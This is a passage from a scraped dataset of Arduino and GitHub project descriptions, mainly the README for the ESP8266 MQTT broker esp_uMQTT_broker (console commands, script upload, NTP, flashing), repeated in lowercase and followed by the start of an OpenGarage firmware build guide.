simple schematics for the atmega64/128/1281/2561/can32/can64/can128 and atmega640/1280/2560 showing a minimal setup using an external crystal. omit the crystal and the two 22pf capacitors if you're using the internal oscillator.\nclick to enlarge:", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000189, "year": null}, {"Unnamed: 0": 2238, "autor": 198, "date": null, "content": "esp_uMQTT_broker\nAn MQTT Broker/Client with scripting support on the ESP8266\nThis program enables the ESP8266 to become the central node in a small distributed IoT system. It implements an MQTT Broker and a simple scripted rule engine with event/action statements that links together the MQTT sensors and actors. It can act as STA, as AP, or as both and it can connect to another MQTT broker (i.e. in the cloud). Here it can also be bridge that forwards and rewrites topics in both directions. Also it can parse JSON structures, send basic HTTP GET requests and do basic I/O: i.e. read and write to local GPIO pins, react on timers and GPIO interrupts, drive GPIO pins with PWM, and read the ADC.\nFind a video that explains the ideas and the architecture of the project at: https://www.youtube.com/watch?v=0K9q4IuB_oA\nYou can use the pure broker functionality (not the CLI and the scripting) in any ESP Arduino project as a libary by going to https://github.com/martin-ger/uMQTTBroker . Just clone (or download the zip-file and extract it) into the libraries directory of your Arduino ESP8266 installation.\nUsage\nIn the user directory there is the main program that serves as a stand-alone MQTT broker, client and bridge. The program starts with the following default configuration:\nap_ssid: MyAP, ap_password: none, ap_on: 1, ap_open: 1\nnetwork: 192.168.4.0/24\nThis means it starts an open AP with ap_ssid MyAP. This default can be changed in the file user_config.h. The default can be overwritten and persistenly saved to flash by using a console interface. This console is available either via the serial port at 115200 baud or via tcp port 7777 (e.g. \"telnet 192.168.4.1 7777\" from a connected STA). It does not yet try to automatically re-connect to an uplink AP (as it does not know a valid ssid or password).\nUse the following commands for an initial setup:\nset ssid your_home_router's_SSID\nset password your_home_router's_password\nset ap_ssid ESP's_ssid\nset ap_password ESP's_password\nshow (to check the parameters)\nsave\nreset\nAfter reboot it will try to automatically connect to your home router and itself as AP is ready for stations to connect.\nThe console understands the following commands:\nGeneral commands:\nhelp: prints a short help message\nshow [config|stats]: prints the current config or some status information and statistics\nsave: saves the current config parameters to flash\nlock [password]: saves and locks the current config, changes are not allowed. Password can be left open if already set before\nunlock password: unlocks the config, requires password from the lock command\nreset [factory]: resets the esp, 'factory' optionally resets WiFi params to default values (works on a locked device only from serial console)\nset speed [80|160]: sets the CPU clock frequency (default 80 Mhz)\nset config_port portno: sets the port number of the console login (default is 7777, 0 disables remote console config)\nset config_access [0|1|2|3]: controls the networks that allow config access (0: no access, 1: only internal, 2: only external, 3: both (default))\nset bitrate [bps]: sets the serial bitrate (default 115200 bps)\nset system_output [0|1|2]: configures systems handling of the serial port (0: none/script, 1: cli commands/responses, 2: cli and info/warnings (default)). Mode 0 means, that any serial input is forwarded to the scripting engine if enabled\nquit: terminates a remote session\nWiFi and network related commands:\nset [ssid|password] value: changes the settings for the uplink AP (WiFi config of your home-router)\nset [ap_ssid|ap_password] value: changes the settings for the soft-AP of the ESP (for your stations)\nset ap_channel [1-13]: sets the channel of the SoftAP (default 1)\nset ap_on [0|1]: selects, whether the soft-AP is disabled (ap_on=0) or enabled (ap_on=1, default)\nset ap_open [0|1]: selects, whether the soft-AP uses WPA2 security (ap_open=0, automatic, if an ap_password is set) or open (ap_open=1)\nset auto_connect [0|1]: selects, whether the WiFi client should automatically retry to connect to the uplink AP (default: on=1)\nset network ip-addr: sets the IP address of the SoftAP's network, network is always /24, esp_uMQTT_broker is always x.x.x.1\nset dns dns-addr: sets a static DNS address\nset dns dhcp: configures use of the dynamic DNS address from DHCP, default\nset ip ip-addr: sets a static IP address for the ESP in the uplink network\nset ip dhcp: configures dynamic IP address for the ESP in the uplink network, default\nset netmask netmask: sets a static netmask for the uplink network\nset gw gw-addr: sets a static gateway address in the uplink network\nset dns_name dnsname: sets the DNS name of the uMQTTBroker (only for clients connected to the softAP) (\"none\" = disabled, default)\nset mdns_mode [0|1|2]: selects, which interface should be announced via mDNS (0: none (default), 1: STA, 2: SoftAP)\nscan: does a scan for APs\nWhile the user interface looks similar to my esp_wifi_repeater at https://github.com/martin-ger/esp_wifi_repeater this does NO NAT routing. AP and STA network are stricly separated and there is no routing in between. The only possible connection via both networks is the uMQTT broker that listens on both interfaces.\nMQTT broker related command:\nshow [mqtt]: prints the current config or status information of the MQTT broker\nset broker_user unsername: sets the username for authentication of MQTT clients (\"none\" if no auth, default)\nset broker_password password: sets the password for authentication of MQTT clients (\"none\" if empty, default)\nset broker_port portno: sets the port number where the broker listens (default: 1883)\nset broker_access mode: controls the networks that allow MQTT broker access (0: no access, 1: only internal, 2: only external, 3: both (default))\nset broker_subscriptions max: sets the max number of subscription the broker can store (default: 30)\nset broker_retained_messages max: sets the max number of retained messages the broker can store (default: 30)\nset broker_clients clients_max: sets the max number of concurrent client connections (default: 0 = mem is the only limit)\nsave_retained: saves the current state of all retained topics (max. 4096 Bytes in sum) to flash, so they will persist a reboot\ndelete_retained: deletes the state of all retained topics in RAM and flash\nset broker_autoretain [0|1]: selects, whether the broker should do a \"save_retained\" automatically each time it receives a new retained message (default off). With this option on the broker can be resetted at any time without loosing state. However, this is slow and too many writes may damage flash mem.\nMQTT client/bridging functionality\nThe broker comes with a \"local\" and a \"remote\" client, which means, the broker itself can publish and subscribe topics. The \"local\" client is a client to the own broker (without the need of an additional TCP connection).\nBy default the \"remote\" MQTT client is disabled. It can be enabled by setting the config parameter \"mqtt_host\" to a hostname different from \"none\". To configure the \"remote\" MQTT client you can set the following parameters:\nset mqtt_host IP_or_hostname: IP or hostname of the MQTT broker (\"none\" disables the MQTT client)\nset mqtt_user username: Username for authentication (\"none\" if no authentication is required at the broker)\nset mqtt_user password: Password for authentication\nset mqtt_ssl [0|1]: Use SSL for connection to the remote broker (default: 0 = off)\nset mqtt_id clientId: Id of the client at the broker (default: \"ESPRouter_xxxxxx\" derived from the MAC address)\npublish [local|remote] topic data [retained]: this publishes a topic (mainly for testing)\nThe remote MQTT server can be accessed via SSL, e.g. a secure test connection to test.mosquitto.org can be configured as following:\nCMD>set mqtt_host test.mosquitto.org\nCMD>set mqtt_port 8883\nCMD>set mqtt_ssl 1\nCMD>save\nCMD>reset\nCertificate checks are not yet implemented.\nScripting\nThe esp_uMQTT_broker comes with a build-in scripting engine. A script enables the ESP not just to act as a passive broker but to react on events (publications and timing events), to send out its own items and handle local I/O. Details on syntax and semantics of the scripting language can be found here: https://github.com/martin-ger/esp_mqtt/blob/master/SCRIPTING.md . Examples of scripts are in the \"scripts\" directory.\nThe script specific CLI commands are:\nscript [portno|url|delete]: opens port for upload of scripts, downloads a script from an URL, or just deletes the current one\nshow script [line_no]: dumps the currently active script starting with the given line (dumpy only about 1 KB, repeat command for more lines)\nset @[num] value: sets the flash variable \"num\" (for use in scripts) to the given inital value (must be shorter than 63 chars)\nset pwm_period period: sets the PWM period in terms of 200ns slots (default: 5000, = 0.1ms ^= 1KHz)\nshow vars: dumps all variables of the current program incl. the persistent flash variables\nDebug commands:\nset script_logging [0|1]: switches logging of script execution on or off (not permanently stored in the configuration)\nset backlog buffersize: sets the size of the backlog buffer (0 = backlog off, default, not permanently stored in the configuration)\nshow backlog: dumps the backlog to the remote console\nThe backlog buffer stores the most recent console outputs of the running script and the CLI. If you detect an error situation you can log into the remote console and dump the recent output with \"show backlog\".\nScripts with size up to 4KB are uploaded to the esp_uMQTT_broker using a network interface.\nThere are two options to upload a script:\nScript Pull (http)\nFor this, you first have to make the scripts available via a web server. A quite simple way to do that is to start a minimal web server in the \"scripts\" directory, i.g. on Linux you can start a server on port 8080 on the delevopment machine with:\n$ cd scripts\npython -m SimpleHTTPServer 8080\nAnother way of course is to upload the script to a real server somewhere on the web.\nThen start the download with the command \"script \" on the concole of the ESP, e.g. like this with the correct hostname and port:\nCMD>script http://myserver:8080/scripts/script.new\nHTTP request to myserver:8080/scripts/script.new started\nHTTP script download completed (330 Bytes)\nSyntax okay\nCMD>\nYou can also download over the internet, e.g. directly from github:\nCMD>script https://raw.githubusercontent.com/martin-ger/esp_mqtt/master/scripts/script.pwm\nHTTP request to https://raw.githubusercontent.com/martin-ger/esp_mqtt/master/scripts/script.pwm started\nHTTP script download completed (749 Bytes)\nSyntax okay\nCMD>\nThe ESP tries to download the script from the given URL and prints upon success or failure a report on the console.\nScript Push (netcat)\nAnother option is to upload the script as plain TCP stream. Start the upload with \"script \" on the console of the ESP, e.g.:\nCMD>script 2000\nWaiting for script upload on port 2000\nCMD>\nNow the ESP listens on the given port for an incoming connection and stores anything it receives as new script. Upload a file using netcat, e.g.:\n$ netcat 192.168.178.29 2000 < user/demo_script2\nThe ESP will store the file and immediatly checks the syntax of the script:\nCMD>script 2000\nWaiting for script upload on port 2000\nScript upload completed (451 Bytes)\nSyntax okay\nCMD>\nYou can examine the currently loaded script using the \"show script\" command. It only displays about 1KB of a script. If you need to see more, use \"show script <line_no>\" with a higher starting line. Newly loaded scripts are stored persistently in flash and will be executed after next reset if they contain no syntax errors. \"script delete\" stops script execution and deleted a script from flash.\nNTP Support\nNTP time is supported and accurate timestamps are available if the sync with an NTP server is done. By default the NTP client is enabled and set to \"1.pool.ntp.org\". It can be changed by setting the config parameter \"ntp_server\" to a hostname or an IP address. An ntp_server of \"none\" will disable the NTP client. Also you can set the \"ntp_timezone\" to an offset from GMT in hours. The system time will be synced with the NTP server every \"ntp_interval\" seconds. Here it uses NOT the full NTP calculation and clock drift compensation. Instead it will just set the local time to the latest received time.\nAfter NTP sync has been completed successfully once, the local time will be published every second under the topic \"$SYS/broker/time\" in the format \"hh:mm:ss\". You can also query the NTP time using the \"time\" command from the commandline.\nset ntp_server IP_or_hostname: sets the name or IP of an NTP server (default \"1.pool.ntp.org\", \"none\" disables NTP)\nset ntp_interval interval: sets the NTP sync interval in seconds (default 300)\nset ntp_timezone tz: sets the timezone in hours offset (default 0)\ntime: prints the current time as ddd hh:mm:ss\nIf you don't have internet access but still need a time base e.g. for your script, you can set the time manually (be aware that the local timer of the ESP has a significant drift):\nset ntp_time hh:mm:ss: sets the NTP time manually\nset ntp_weekday ddd: sets the current day of week (\"Mon\"-\"Sun\")\nDNS\nA simple DNS responder is included, so an MQTT client connected to the AP interface might also use a name instead of the IP. Any valid domain name can be configured (shorter than 31 chars).\nset dns_name dnsname: sets the DNS name of the uMQTTBroker (only for clients connected to the softAP) (\"none\" = disabled, default)\nmDNS\nmDNS is supported and depending on \"mdns_mode\" the broker responds on the name \"mqtt.local\" with one of its two addresses:\nset mdns_mode [0|1|2]: selects, which interface address should be announced via mDNS (0=none (default), 1 = STA, 2 = SoftAP)\nBuilding and Flashing\nThe code can be used in any project that is compiled using the NONOS_SDK or the esp-open-sdk. Also the complete broker in the user directory can be build using the standard SDKs after adapting the variables in the Makefile.\nDownload the repository using\n$ git clone --recursive https://github.com/martin-ger/esp_mqtt.git\nConfigure the build options in \"user_config.h\", then build the esp_uMQTT_broker firmware with \"make\". \"make flash\" flashes it onto an esp8266.\nIf you want to use the precompiled binaries from the firmware directory you can flash them directly on an ESP8266, e.g. with\n$ esptool.py --port /dev/ttyUSB0 write_flash -fs 32m 0x00000 firmware/0x00000.bin 0x10000 firmware/0x10000.bin\nOn Windows you can flash it using the \"ESP8266 Download Tool\" available at https://espressif.com/en/support/download/other-tools. Download the two files 0x00000.bin and 0x10000.bin from the firmware directory. For a generic ESP12, a NodeMCU or a Wemos D1 use the following settings (for an ESP-01 change FLASH SIZE to \"8Mbit\"):\nKnown Issues\nIf \"QIO\" mode fails on your device, try \"DIO\" instead. Also have a look at the \"Detected Info\" to check size and mode of the flash chip. If your downloaded firmware still doesn't start properly, please check with the enclosed checksums whether the binary files are possibly corrupted.\nThe MQTT broker library\nThe library code has been moved to a separate repository at https://github.com/martin-ger/uMQTTBroker and is included recursivly.\nIt can be integrated into any NONOS SDK (or esp-open-sdk) program (\"make -f Makefile.orig lib\" will build the mqtt code as a C library). You can find a minimal NONOS SDK sample in the directory \"user_basic\" in this repository. Rename it to \"user\", adapt \"user_config.h\", and do the \"make\" to build a small demo that just starts an MQTT broker without any additional logic.\nThe broker is started by simply including:\n#include \"mqtt/mqtt_server.h\"\nand then calling\nbool MQTT_server_start(uint16_t portno, uint16_t max_subscriptions, uint16_t max_retained_topics);\nin the \"user_init()\" (or Arduino \"setup()\") function. Now it is ready for MQTT connections on all activated interfaces (STA and/or AP). Please note, that the lib uses two tasks (with prio 1 and 2) for client and broker. Thus, only task with prio 0 is left for a user application.\nLimitations on the number of clients\nTo adjust memory consumption of one MQTT connection and thus the max number of concurrent connections you can redefine MQTT_BUF_SIZE and QUEUE_BUFFER_SIZE in \"user_config.h\". MQTT_BUF_SIZE is the max. size of pending inbound messages for one connection (and thus also the max. size of a single MQTT message) and QUEUE_BUFFER_SIZE is the max. size of all pending outbound messages for one connection. Currently these parameters are set to 1024 resp. 2048 bytes, resulting in a memory consumption of about 4 KB per connection and a max number of connections of about 8-9 (depending on the memory usage of the rest of the program). When you reduce buffer sizes, e.g. to 512 and 1024 bytes, a single connection requires only about 2.5 KB resulting in up to 13 possible concurrent MQTT connections. In any case you have to increase the number of TCP connections (default 5) first by calling \"espconn_tcp_set_max_con(n)\" with n, the max. number of concurrent TCP connections, less or equal to 15.\nAlso there is a hard limitation on the number of STAs connected to the SoftAP, which is 8. I.e. when using the esp_uMQTT_broker only with clients via the SoftAP interface, even with reduced memory consumtion, the limit of different client nodes is still 8, as it is imposed by the binary WiFi driver. Only when used via the STA interface and an external AP you can connect more than 8 MQTT clients.\nThanks\npfalcon for esp_open_sdk (best with NONOS SDK V2.2 patches - https://github.com/xxxajk/esp-open-lwip)\ntuanpmt for esp_mqtt (https://github.com/tuanpmt/esp_mqtt )\neadf for esp8266_easygpio (https://github.com/eadf/esp8266_easygpio )\nStefan Br\u00fcns for ESP8266_new_pwm (https://github.com/StefanBruens/ESP8266_new_pwm )\nMartin d'Allens for esphttpclient (https://github.com/Caerbannog/esphttpclient )\nMoritz Warning for SimpleDNS (https://github.com/mwarning/SimpleDNS )\nIan Craggs for mqtt_topic\nmany others contributing to open software (for the ESP8266)", "link": "https://github.com/martin-ger/esp_mqtt", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp_umqtt_broker\nan mqtt broker/client with scripting support on the esp8266\nthis program enables the esp8266 to become the central node in a small distributed iot system. it implements an mqtt broker and a simple scripted rule engine with event/action statements that links together the mqtt sensors and actors. it can act as sta, as ap, or as both and it can connect to another mqtt broker (i.e. in the cloud). here it can also be bridge that forwards and rewrites topics in both directions. also it can parse json structures, send basic http get requests and do basic i/o: i.e. read and write to local gpio pins, react on timers and gpio interrupts, drive gpio pins with pwm, and read the adc.\nfind a video that explains the ideas and the architecture of the project at: https://www.youtube.com/watch?v=0k9q4iub_oa\nyou can use the pure broker functionality (not the cli and the scripting) in any esp arduino project as a libary by going to https://github.com/martin-ger/umqttbroker . just clone (or download the zip-file and extract it) into the libraries directory of your arduino esp8266 installation.\nusage\nin the user directory there is the main program that serves as a stand-alone mqtt broker, client and bridge. the program starts with the following default configuration:\nap_ssid: myap, ap_password: none, ap_on: 1, ap_open: 1\nnetwork: 192.168.4.0/24\nthis means it starts an open ap with ap_ssid myap. this default can be changed in the file user_config.h. the default can be overwritten and persistenly saved to flash by using a console interface. this console is available either via the serial port at 115200 baud or via tcp port 7777 (e.g. \"telnet 192.168.4.1 7777\" from a connected sta). it does not yet try to automatically re-connect to an uplink ap (as it does not know a valid ssid or password).\nuse the following commands for an initial setup:\nset ssid your_home_router's_ssid\nset password your_home_router's_password\nset ap_ssid esp's_ssid\nset ap_password esp's_password\nshow (to check the parameters)\nsave\nreset\nafter reboot it will try to automatically connect to your home router and itself as ap is ready for stations to connect.\nthe console understands the following commands:\ngeneral commands:\nhelp: prints a short help message\nshow [config|stats]: prints the current config or some status information and statistics\nsave: saves the current config parameters to flash\nlock [password]: saves and locks the current config, changes are not allowed. password can be left open if already set before\nunlock password: unlocks the config, requires password from the lock command\nreset [factory]: resets the esp, 'factory' optionally resets wifi params to default values (works on a locked device only from serial console)\nset speed [80|160]: sets the cpu clock frequency (default 80 mhz)\nset config_port portno: sets the port number of the console login (default is 7777, 0 disables remote console config)\nset config_access [0|1|2|3]: controls the networks that allow config access (0: no access, 1: only internal, 2: only external, 3: both (default))\nset bitrate [bps]: sets the serial bitrate (default 115200 bps)\nset system_output [0|1|2]: configures systems handling of the serial port (0: none/script, 1: cli commands/responses, 2: cli and info/warnings (default)). mode 0 means, that any serial input is forwarded to the scripting engine if enabled\nquit: terminates a remote session\nwifi and network related commands:\nset [ssid|password] value: changes the settings for the uplink ap (wifi config of your home-router)\nset [ap_ssid|ap_password] value: changes the settings for the soft-ap of the esp (for your stations)\nset ap_channel [1-13]: sets the channel of the softap (default 1)\nset ap_on [0|1]: selects, whether the soft-ap is disabled (ap_on=0) or enabled (ap_on=1, default)\nset ap_open [0|1]: selects, whether the soft-ap uses wpa2 security (ap_open=0, automatic, if an ap_password is set) or open (ap_open=1)\nset auto_connect [0|1]: selects, whether the wifi client should automatically retry to connect to the uplink ap (default: on=1)\nset network ip-addr: sets the ip address of the softap's network, network is always /24, esp_umqtt_broker is always x.x.x.1\nset dns dns-addr: sets a static dns address\nset dns dhcp: configures use of the dynamic dns address from dhcp, default\nset ip ip-addr: sets a static ip address for the esp in the uplink network\nset ip dhcp: configures dynamic ip address for the esp in the uplink network, default\nset netmask netmask: sets a static netmask for the uplink network\nset gw gw-addr: sets a static gateway address in the uplink network\nset dns_name dnsname: sets the dns name of the umqttbroker (only for clients connected to the softap) (\"none\" = disabled, default)\nset mdns_mode [0|1|2]: selects, which interface should be announced via mdns (0: none (default), 1: sta, 2: softap)\nscan: does a scan for aps\nwhile the user interface looks similar to my esp_wifi_repeater at https://github.com/martin-ger/esp_wifi_repeater this does no nat routing. ap and sta network are stricly separated and there is no routing in between. the only possible connection via both networks is the umqtt broker that listens on both interfaces.\nmqtt broker related command:\nshow [mqtt]: prints the current config or status information of the mqtt broker\nset broker_user unsername: sets the username for authentication of mqtt clients (\"none\" if no auth, default)\nset broker_password password: sets the password for authentication of mqtt clients (\"none\" if empty, default)\nset broker_port portno: sets the port number where the broker listens (default: 1883)\nset broker_access mode: controls the networks that allow mqtt broker access (0: no access, 1: only internal, 2: only external, 3: both (default))\nset broker_subscriptions max: sets the max number of subscription the broker can store (default: 30)\nset broker_retained_messages max: sets the max number of retained messages the broker can store (default: 30)\nset broker_clients clients_max: sets the max number of concurrent client connections (default: 0 = mem is the only limit)\nsave_retained: saves the current state of all retained topics (max. 4096 bytes in sum) to flash, so they will persist a reboot\ndelete_retained: deletes the state of all retained topics in ram and flash\nset broker_autoretain [0|1]: selects, whether the broker should do a \"save_retained\" automatically each time it receives a new retained message (default off). with this option on the broker can be resetted at any time without loosing state. however, this is slow and too many writes may damage flash mem.\nmqtt client/bridging functionality\nthe broker comes with a \"local\" and a \"remote\" client, which means, the broker itself can publish and subscribe topics. the \"local\" client is a client to the own broker (without the need of an additional tcp connection).\nby default the \"remote\" mqtt client is disabled. it can be enabled by setting the config parameter \"mqtt_host\" to a hostname different from \"none\". to configure the \"remote\" mqtt client you can set the following parameters:\nset mqtt_host ip_or_hostname: ip or hostname of the mqtt broker (\"none\" disables the mqtt client)\nset mqtt_user username: username for authentication (\"none\" if no authentication is required at the broker)\nset mqtt_user password: password for authentication\nset mqtt_ssl [0|1]: use ssl for connection to the remote broker (default: 0 = off)\nset mqtt_id clientid: id of the client at the broker (default: \"esprouter_xxxxxx\" derived from the mac address)\npublish [local|remote] topic data [retained]: this publishes a topic (mainly for testing)\nthe remote mqtt server can be accessed via ssl, e.g. a secure test connection to test.mosquitto.org can be configured as following:\ncmd>set mqtt_host test.mosquitto.org\ncmd>set mqtt_port 8883\ncmd>set mqtt_ssl 1\ncmd>save\ncmd>reset\ncertificate checks are not yet implemented.\nscripting\nthe esp_umqtt_broker comes with a build-in scripting engine. a script enables the esp not just to act as a passive broker but to react on events (publications and timing events), to send out its own items and handle local i/o. details on syntax and semantics of the scripting language can be found here: https://github.com/martin-ger/esp_mqtt/blob/master/scripting.md . examples of scripts are in the \"scripts\" directory.\nthe script specific cli commands are:\nscript [portno|url|delete]: opens port for upload of scripts, downloads a script from an url, or just deletes the current one\nshow script [line_no]: dumps the currently active script starting with the given line (dumpy only about 1 kb, repeat command for more lines)\nset @[num] value: sets the flash variable \"num\" (for use in scripts) to the given inital value (must be shorter than 63 chars)\nset pwm_period period: sets the pwm period in terms of 200ns slots (default: 5000, = 0.1ms ^= 1khz)\nshow vars: dumps all variables of the current program incl. the persistent flash variables\ndebug commands:\nset script_logging [0|1]: switches logging of script execution on or off (not permanently stored in the configuration)\nset backlog buffersize: sets the size of the backlog buffer (0 = backlog off, default, not permanently stored in the configuration)\nshow backlog: dumps the backlog to the remote console\nthe backlog buffer stores the most recent console outputs of the running script and the cli. if you detect an error situation you can log into the remote console and dump the recent output with \"show backlog\".\nscripts with size up to 4kb are uploaded to the esp_umqtt_broker using a network interface.\nthere are two options to upload a script:\nscript pull (http)\nfor this, you first have to make the scripts available via a web server. a quite simple way to do that is to start a minimal web server in the \"scripts\" directory, i.g. on linux you can start a server on port 8080 on the delevopment machine with:\n$ cd scripts\npython -m simplehttpserver 8080\nanother way of course is to upload the script to a real server somewhere on the web.\nthen start the download with the command \"script \" on the concole of the esp, e.g. like this with the correct hostname and port:\ncmd>script http://myserver:8080/scripts/script.new\nhttp request to myserver:8080/scripts/script.new started\nhttp script download completed (330 bytes)\nsyntax okay\ncmd>\nyou can also download over the internet, e.g. directly from github:\ncmd>script https://raw.githubusercontent.com/martin-ger/esp_mqtt/master/scripts/script.pwm\nhttp request to https://raw.githubusercontent.com/martin-ger/esp_mqtt/master/scripts/script.pwm started\nhttp script download completed (749 bytes)\nsyntax okay\ncmd>\nthe esp tries to download the script from the given url and prints upon success or failure a report on the console.\nscript push (netcat)\nanother option is to upload the script as plain tcp stream. start the upload with \"script \" on the console of the esp, e.g.:\ncmd>script 2000\nwaiting for script upload on port 2000\ncmd>\nnow the esp listens on the given port for an incoming connection and stores anything it receives as new script. upload a file using netcat, e.g.:\n$ netcat 192.168.178.29 2000 < user/demo_script2\nthe esp will store the file and immediatly checks the syntax of the script:\ncmd>script 2000\nwaiting for script upload on port 2000\nscript upload completed (451 bytes)\nsyntax okay\ncmd>\nyou can examine the currently loaded script using the \"show script\" command. it only displays about 1kb of a script. if you need to see more, use \"show script <line_no>\" with a higher starting line. newly loaded scripts are stored persistently in flash and will be executed after next reset if they contain no syntax errors. \"script delete\" stops script execution and deleted a script from flash.\nntp support\nntp time is supported and accurate timestamps are available if the sync with an ntp server is done. by default the ntp client is enabled and set to \"1.pool.ntp.org\". it can be changed by setting the config parameter \"ntp_server\" to a hostname or an ip address. an ntp_server of \"none\" will disable the ntp client. also you can set the \"ntp_timezone\" to an offset from gmt in hours. the system time will be synced with the ntp server every \"ntp_interval\" seconds. here it uses not the full ntp calculation and clock drift compensation. instead it will just set the local time to the latest received time.\nafter ntp sync has been completed successfully once, the local time will be published every second under the topic \"$sys/broker/time\" in the format \"hh:mm:ss\". you can also query the ntp time using the \"time\" command from the commandline.\nset ntp_server ip_or_hostname: sets the name or ip of an ntp server (default \"1.pool.ntp.org\", \"none\" disables ntp)\nset ntp_interval interval: sets the ntp sync interval in seconds (default 300)\nset ntp_timezone tz: sets the timezone in hours offset (default 0)\ntime: prints the current time as ddd hh:mm:ss\nif you don't have internet access but still need a time base e.g. for your script, you can set the time manually (be aware that the local timer of the esp has a significant drift):\nset ntp_time hh:mm:ss: sets the ntp time manually\nset ntp_weekday ddd: sets the current day of week (\"mon\"-\"sun\")\ndns\na simple dns responder is included, so an mqtt client connected to the ap interface might also use a name instead of the ip. any valid domain name can be configured (shorter than 31 chars).\nset dns_name dnsname: sets the dns name of the umqttbroker (only for clients connected to the softap) (\"none\" = disabled, default)\nmdns\nmdns is supported and depending on \"mdns_mode\" the broker responds on the name \"mqtt.local\" with one of its two addresses:\nset mdns_mode [0|1|2]: selects, which interface address should be announced via mdns (0=none (default), 1 = sta, 2 = softap)\nbuilding and flashing\nthe code can be used in any project that is compiled using the nonos_sdk or the esp-open-sdk. also the complete broker in the user directory can be build using the standard sdks after adapting the variables in the makefile.\ndownload the repository using\n$ git clone --recursive https://github.com/martin-ger/esp_mqtt.git\nconfigure the build options in \"user_config.h\", then build the esp_umqtt_broker firmware with \"make\". \"make flash\" flashes it onto an esp8266.\nif you want to use the precompiled binaries from the firmware directory you can flash them directly on an esp8266, e.g. with\n$ esptool.py --port /dev/ttyusb0 write_flash -fs 32m 0x00000 firmware/0x00000.bin 0x10000 firmware/0x10000.bin\non windows you can flash it using the \"esp8266 download -----> tool !!! \" available at https://espressif.com/en/support/download/other-tools. download the two files 0x00000.bin and 0x10000.bin from the firmware directory. for a generic esp12, a nodemcu or a wemos d1 use the following settings (for an esp-01 change flash size to \"8mbit\"):\nknown issues\nif \"qio\" mode fails on your device, try \"dio\" instead. also have a look at the \"detected info\" to check size and mode of the flash chip. if your downloaded firmware still doesn't start properly, please check with the enclosed checksums whether the binary files are possibly corrupted.\nthe mqtt broker library\nthe library code has been moved to a separate repository at https://github.com/martin-ger/umqttbroker and is included recursivly.\nit can be integrated into any nonos sdk (or esp-open-sdk) program (\"make -f makefile.orig lib\" will build the mqtt code as a c library). you can find a minimal nonos sdk sample in the directory \"user_basic\" in this repository. rename it to \"user\", adapt \"user_config.h\", and do the \"make\" to build a small demo that just starts an mqtt broker without any additional logic.\nthe broker is started by simply including:\n#include \"mqtt/mqtt_server.h\"\nand then calling\nbool mqtt_server_start(uint16_t portno, uint16_t max_subscriptions, uint16_t max_retained_topics);\nin the \"user_init()\" (or arduino \"setup()\") function. now it is ready for mqtt connections on all activated interfaces (sta and/or ap). please note, that the lib uses two tasks (with prio 1 and 2) for client and broker. thus, only task with prio 0 is left for a user application.\nlimitations on the number of clients\nto adjust memory consumption of one mqtt connection and thus the max number of concurrent connections you can redefine mqtt_buf_size and queue_buffer_size in \"user_config.h\". mqtt_buf_size is the max. size of pending inbound messages for one connection (and thus also the max. size of a single mqtt message) and queue_buffer_size is the max. size of all pending outbound messages for one connection. currently these parameters are set to 1024 resp. 2048 bytes, resulting in a memory consumption of about 4 kb per connection and a max number of connections of about 8-9 (depending on the memory usage of the rest of the program). when you reduce buffer sizes, e.g. to 512 and 1024 bytes, a single connection requires only about 2.5 kb resulting in up to 13 possible concurrent mqtt connections. in any case you have to increase the number of tcp connections (default 5) first by calling \"espconn_tcp_set_max_con(n)\" with n, the max. number of concurrent tcp connections, less or equal to 15.\nalso there is a hard limitation on the number of stas connected to the softap, which is 8. i.e. when using the esp_umqtt_broker only with clients via the softap interface, even with reduced memory consumtion, the limit of different client nodes is still 8, as it is imposed by the binary wifi driver. only when used via the sta interface and an external ap you can connect more than 8 mqtt clients.\nthanks\npfalcon for esp_open_sdk (best with nonos sdk v2.2 patches - https://github.com/xxxajk/esp-open-lwip)\ntuanpmt for esp_mqtt (https://github.com/tuanpmt/esp_mqtt )\neadf for esp8266_easygpio (https://github.com/eadf/esp8266_easygpio )\nstefan br\u00fcns for esp8266_new_pwm (https://github.com/stefanbruens/esp8266_new_pwm )\nmartin d'allens for esphttpclient (https://github.com/caerbannog/esphttpclient )\nmoritz warning for simpledns (https://github.com/mwarning/simpledns )\nian craggs for mqtt_topic\nmany others contributing to open software (for the esp8266)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000198, "year": null}, {"Unnamed: 0": 2261, "autor": 221, "date": null, "content": "This folder contains firmware source code and documentation for OpenGarage. For details, visit http://opengarage.io\nFor Firmware release notes, go to https://github.com/OpenGarage/OpenGarage-Firmware/releases\nFirmware Compilation Instructions:\nRequirement:\nArduino (https://arduino.cc) with ESP8266 core 2.7.4 or above for Arduino (https://github.com/esp8266/Arduino/releases/tag/2.7.4)\nInstead of installing Arduino, you can also directly use make (this folder includes a copy of makeESPArduino: https://github.com/plerup/makeEspArduino)\nBlynk library for Arduino (https://github.com/blynkkk/blynk-library)\nMQTT PubSUbClient https://github.com/knolleary/pubsubclient (version 2.8)\nAM2320 library: https://github.com/hibikiledo/AM2320/releases\nOneWire library: https://www.pjrc.com/teensy/td_libs_OneWire.html\nDallasTemperature library: https://github.com/milesburton/Arduino-Temperature-Control-Library/releases\nDHTesp library: https://github.com/beegee-tokyo/DHTesp/releases\nThis (OpenGarage) source code\nSetting up a Dev Environment\nInstall Arduino with ESP8266 core 2.7.4 (or use make directly, following https://github.com/plerup/makeEspArduino).\nInstall Arduino libraries referenced above.\nDownload this repository and extract the OpenGarage library to your Arduino's libraries folder.\nCompilation\nTo compile the firmware code using makeESPArduino, simply run make in command line. You may need to open Makefile and modify some path variables therein to match where you installed the esp8266 folder.\nTo compile using Arduino: launch Arduino, and select\nFile -> Examples -> OpenGarage -> mainArduino.\nTools -> Board -> Generic ESP8266 Module (if this is not available, check if you've installed the ESP8266 core).\nTools -> Flash Mode -> DIO.\nTools -> Flash Size -> 2M (1M SPIFFS).\nPress Ctrl + R to compile. The compiled firmware (named mainArduino.cpp.bin) is by default copied to a temporary folder.\nThe firmware supports built-in web interface. The HTML data are embedded as program memory strings. Go to the html subfolder, which contains the original HTML files, and a html2raw tool to convert these HTML files into program memory strings. If you make changes to the HTML files, re-run html2raw to re-generate the program memory strings. You can also directly modify the program memory strings, but keeping the original HTML files makes it easy to check and verify your HTML files in a browser.\nUploading\nAs OpenGarage firmware supports OTA (over-the-air) update, you can upload the firmware through the web interface. At the homepage, find the Update button and follow that to upload a new firmware. If your OpenGarage is in AP mode and not connected to any WiFi network yet, you can 